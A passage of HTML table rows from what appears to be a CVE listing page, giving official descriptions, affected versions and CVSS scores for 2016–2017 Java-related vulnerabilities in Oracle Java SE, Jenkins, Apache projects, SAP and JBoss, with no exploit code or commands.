		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Serialization). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131; Java SE Embedded: 8u131; JRockit: R28.3.14. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10108">CVE-2017-10108</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Serialization). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131; Java SE Embedded: 8u131; JRockit: R28.3.14. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10107">CVE-2017-10107</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: RMI). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131; Java SE Embedded: 8u131. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 9.6 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10105">CVE-2017-10105</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Deployment). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 4.3 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10104">CVE-2017-10104</a></td>
		<td valign="top">Vulnerability in the Java Advanced Management Console component of Oracle Java SE (subcomponent: Server). The supported version that is affected is Java Advanced Management Console: 2.6. Easily exploitable vulnerability allows low privileged attacker with network access via HTTP to compromise Java Advanced Management Console. While the vulnerability is in Java Advanced Management Console, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java Advanced Management Console accessible data as well as unauthorized read access to a subset of Java Advanced Management Console accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Java Advanced Management Console. CVSS 3.0 Base Score 7.4 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10102">CVE-2017-10102</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: RMI). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131; Java SE Embedded: 8u131. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. While the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.0 Base Score 9.0 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10101">CVE-2017-10101</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: JAXP). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131; Java SE Embedded: 8u131. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 9.6 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10096">CVE-2017-10096</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: JAXP). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131; Java SE Embedded: 8u131. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 9.6 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10090">CVE-2017-10090</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Libraries). Supported versions that are affected are Java SE: 7u141 and 8u131; Java SE Embedded: 8u131. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 9.6 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10089">CVE-2017-10089</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: ImageIO). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 9.6 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10087">CVE-2017-10087</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Libraries). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131; Java SE Embedded: 8u131. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 9.6 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10086">CVE-2017-10086</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: JavaFX). Supported versions that are affected are Java SE: 7u141 and 8u131. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 9.6 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10081">CVE-2017-10081</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Hotspot). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131; Java SE Embedded: 8u131. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 4.3 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10078">CVE-2017-10078</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Scripting). The supported version that is affected is Java SE: 8u131. Easily exploitable vulnerability allows low privileged attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE accessible data as well as unauthorized access to critical data or complete access to all Java SE accessible data. Note: This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 8.1 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10074">CVE-2017-10074</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Hotspot). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131; Java SE Embedded: 8u131. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10067">CVE-2017-10067</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Security). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 7.5 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10062">CVE-2017-10062</a></td>
		<td valign="top">Vulnerability in the Solaris component of Oracle Sun Systems Products Suite (subcomponent: Oracle Java Web Console). The supported version that is affected is 10. Easily exploitable vulnerability allows low privileged attacker with logon to the infrastructure where Solaris executes to compromise Solaris. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Solaris accessible data as well as unauthorized read access to a subset of Solaris accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Solaris. CVSS 3.0 Base Score 5.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10053">CVE-2017-10053</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: 2D). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131; Java SE Embedded: 8u131; JRockit: R28.3.14. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-1000359">CVE-2017-1000359</a></td>
		<td valign="top">Java out of memory error and significant increase in resource consumption. Component: OpenDaylight odl-mdsal-xsql is vulnerable to this flaw. Version: The tested versions are OpenDaylight 3.3 and 4.0.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-1000357">CVE-2017-1000357</a></td>
		<td valign="top">Denial of Service attack when the switch rejects to receive packets from the controller. Component: This vulnerability affects OpenDaylight odl-l2switch-switch, which is the feature responsible for the OpenFlow communication. Version: OpenDaylight versions 3.3 (Lithium-SR3), 3.4 (Lithium-SR4), 4.0 (Beryllium), 4.1 (Beryllium-SR1), 4.2 (Beryllium-SR2), and 4.4 (Beryllium-SR4) are affected by this flaw. Java version is openjdk version 1.8.0_91.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-1000355">CVE-2017-1000355</a></td>
		<td valign="top">Jenkins versions 2.56 and earlier as well as 2.46.1 LTS and earlier are vulnerable to an XStream: Java crash when trying to instantiate void/Void.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-1000353">CVE-2017-1000353</a></td>
		<td valign="top">Jenkins versions 2.56 and earlier as well as 2.46.1 LTS and earlier are vulnerable to an unauthenticated remote code execution. An unauthenticated remote code execution vulnerability allowed attackers to transfer a serialized Java `SignedObject` object to the Jenkins CLI, that would be deserialized using a new `ObjectInputStream`, bypassing the existing blacklist-based protection mechanism. We're fixing this issue by adding `SignedObject` to the blacklist. We're also backporting the new HTTP CLI protocol from Jenkins 2.54 to LTS 2.46.2, and deprecating the remoting-based (i.e. Java serialization) CLI protocol, disabling it by default.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-1000209">CVE-2017-1000209</a></td>
		<td valign="top">The Java WebSocket client nv-websocket-client does not verify that the server hostname matches a domain name in the subject's Common Name (CN) or subjectAltName field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL/TLS servers via an arbitrary valid certificate.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-1000105">CVE-2017-1000105</a></td>
		<td valign="top">The optional Run/Artifacts permission can be enabled by setting a Java system property. Blue Ocean did not check this permission before providing access to archived artifacts, Item/Read permission was sufficient.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-1000034">CVE-2017-1000034</a></td>
		<td valign="top">Akka versions &lt;=2.4.16 and 2.5-M1 are vulnerable to a java deserialization attack in its Remoting component resulting in remote code execution in the context of the ActorSystem.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-1000030">CVE-2017-1000030</a></td>
		<td valign="top">Oracle, GlassFish Server Open Source Edition 3.0.1 (build 22) is vulnerable to Java Key Store Password Disclosure vulnerability, that makes it possible to provide an unauthenticated attacker plain text password of administrative user and grant access to the web-based administration interface.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-9563">CVE-2016-9563</a></td>
		<td valign="top">BC-BMT-BPM-DSK in SAP NetWeaver AS JAVA 7.5 allows remote authenticated users to conduct XML External Entity (XXE) attacks via the sap.com~tc~bpem~him~uwlconn~provider~web/bpemuwlconn URI, aka SAP Security Note 2296909.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-9562">CVE-2016-9562</a></td>
		<td valign="top">SAP NetWeaver AS JAVA 7.4 allows remote attackers to cause a Denial of Service (null pointer exception and icman outage) via an HTTPS request to the sap.com~P4TunnelingApp!web/myServlet URI, aka SAP Security Note 2313835.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-9498">CVE-2016-9498</a></td>
		<td valign="top">ManageEngine Applications Manager 12 and 13 before build 13200, allows unserialization of unsafe Java objects. The vulnerability can be exploited by remote user without authentication and it allows to execute remote code compromising the application as well as the operating system. As Application Manager's RMI registry is running with privileges of system administrator, by exploiting this vulnerability an attacker gains highest privileges on the underlying operating system.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-9299">CVE-2016-9299</a></td>
		<td valign="top">The remoting module in Jenkins before 2.32 and LTS before 2.19.3 allows remote attackers to execute arbitrary code via a crafted serialized Java object, which triggers an LDAP query to a third-party server.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-8749">CVE-2016-8749</a></td>
		<td valign="top">Apache Camel's Jackson and JacksonXML unmarshalling operation are vulnerable to Remote Code Execution attacks.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-8744">CVE-2016-8744</a></td>
		<td valign="top">Apache Brooklyn uses the SnakeYAML library for parsing YAML inputs. SnakeYAML allows the use of YAML tags to indicate that SnakeYAML should unmarshal data to a Java type. In the default configuration in Brooklyn before 0.10.0, SnakeYAML will allow unmarshalling to any Java type available on the classpath. This could provide an authenticated user with a means to cause the JVM running Brooklyn to load and run Java code without detection by Brooklyn. Such code would have the privileges of the Java process running Brooklyn, including the ability to open files and network connections, and execute system commands. There is known to be a proof-of-concept exploit using this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-8741">CVE-2016-8741</a></td>
		<td valign="top">The Apache Qpid Broker for Java can be configured to use different so called AuthenticationProviders to handle user authentication. Among the choices are the SCRAM-SHA-1 and SCRAM-SHA-256 AuthenticationProvider types. It was discovered that these AuthenticationProviders in Apache Qpid Broker for Java 6.0.x before 6.0.6 and 6.1.x before 6.1.1 prematurely terminate the SCRAM SASL negotiation if the provided user name does not exist thus allowing remote attacker to determine the existence of user accounts. The Vulnerability does not apply to AuthenticationProviders other than SCRAM-SHA-1 and SCRAM-SHA-256.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-8648">CVE-2016-8648</a></td>
		<td valign="top">It was found that the Karaf container used by Red Hat JBoss Fuse 6.x, and Red Hat JBoss A-MQ 6.x, deserializes objects passed to MBeans via JMX operations. An attacker could use this flaw to execute remote code on the server as the user running the Java Virtual Machine if the target MBean contain deserialization gadgets in its classpath.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-8511">CVE-2016-8511</a></td>
		<td valign="top">A Remote Code Execution vulnerability in HPE Network Automation using RPCServlet and Java Deserialization version v9.1x, v9.2x, v10.00, v10.00.01, v10.00.02, v10.10, v10.11, v10.11.01, v10.20 was found.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-8328">CVE-2016-8328</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Java Mission Control). The supported version that is affected is Java SE: 8u112. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE accessible data. Note: Applies to Java Mission Control Installation. CVSS v3.0 Base Score 3.7 (Integrity impacts).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-8281">CVE-2016-8281</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle Platform Security for Java component in Oracle Fusion Middleware 12.1.3.0.0, 12.2.1.0.0, and 12.2.1.1.0 allows remote authenticated users to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2016-5536.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-7843">CVE-2016-7843</a></td>
		<td valign="top">Directory traversal vulnerability in AttacheCase for Java 0.60 and earlier, AttacheCase Lite 1.4.6 and earlier, and AttacheCase Pro 1.5.7 and earlier allows remote attackers to read arbitrary files via specially crafted ATC file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-7065">CVE-2016-7065</a></td>
		<td valign="top">The JMX servlet in Red Hat JBoss Enterprise Application Platform (EAP) 4 and 5 allows remote authenticated users to cause a denial of service and possibly execute arbitrary code via a crafted serialized Java object.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-7043">CVE-2016-7043</a></td>
		<td valign="top">It has been reported that KIE server and Busitess Central before version 7.21.0.Final contain username and password as plaintext Java properties. Any app deployed on the same server would have access to these properties, thus granting access to ther services.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-6859">CVE-2016-6859</a></td>
		<td valign="top">Hybris Management Console (HMC) in SAP Hybris before 6.0 allows remote attackers to obtain sensitive information by triggering an error and then reading a Java stack trace.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-6814">CVE-2016-6814</a></td>
		<td valign="top">When an application with unsupported Codehaus versions of Groovy from 1.7.0 to 2.4.3, Apache Groovy 2.4.4 to 2.4.7 on classpath uses standard Java serialization mechanisms, e.g. to communicate between servers or to store local data, it was possible for an attacker to bake a special serialized object that will execute code directly when deserialized. All applications which rely on serialization and do not isolate the code which deserializes objects were subject to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-6809">CVE-2016-6809</a></td>
		<td valign="top">Apache Tika before 1.14 allows Java code execution for serialized objects embedded in MATLAB files. The issue exists because Tika invokes JMatIO to do native deserialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-6793">CVE-2016-6793</a></td>
		<td valign="top">The DiskFileItem class in Apache Wicket 6.x before 6.25.0 and 1.5.x before 1.5.17 allows remote attackers to cause a denial of service (infinite loop) and write to, move, and delete files with the permissions of DiskFileItem, and if running on a Java VM before 1.3.1, execute arbitrary code via a crafted serialized Java object.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-6501">CVE-2016-6501</a></td>
		<td valign="top">JFrog Artifactory before 4.11 allows remote attackers to execute arbitrary code via an LDAP attribute with a crafted serialized Java object, aka LDAP entry poisoning.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-6500">CVE-2016-6500</a></td>
		<td valign="top">Unspecified methods in the RACF Connector component before 1.1.1.0 in ForgeRock OpenIDM and OpenICF improperly call the SearchControls constructor with returnObjFlag set to true, which allows remote attackers to execute arbitrary code via a crafted serialized Java object, aka LDAP entry poisoning.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-6497">CVE-2016-6497</a></td>
		<td valign="top">main/java/org/apache/directory/groovyldap/LDAP.java in the Groovy LDAP API in Apache allows attackers to conduct LDAP entry poisoning attacks by leveraging setting returnObjFlag to true for all search methods.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-6496">CVE-2016-6496</a></td>
		<td valign="top">The LDAP directory connector in Atlassian Crowd before 2.8.8 and 2.9.x before 2.9.5 allows remote attackers to execute arbitrary code via an LDAP attribute with a crafted serialized Java object, aka LDAP entry poisoning.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2016-5983">CVE-2016-5983</a></td>
